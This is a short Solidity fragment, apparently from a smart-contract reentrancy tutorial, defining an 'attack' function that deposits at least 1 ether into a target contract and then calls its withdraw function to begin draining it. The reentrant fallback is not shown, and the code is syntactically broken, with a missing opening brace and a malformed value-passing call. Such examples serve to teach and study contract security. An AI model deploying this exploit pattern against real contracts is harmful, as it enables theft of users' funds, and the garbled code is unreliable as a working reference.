
// Attack function: initiate attack by first depositing and then withdrawing

function attack() external payable 

require(msg.value >= 1 ether, "Minimum attack deposit is 1 ether");

depositFunds.deposit(value: msg.value)();

depositFunds.withdraw();}
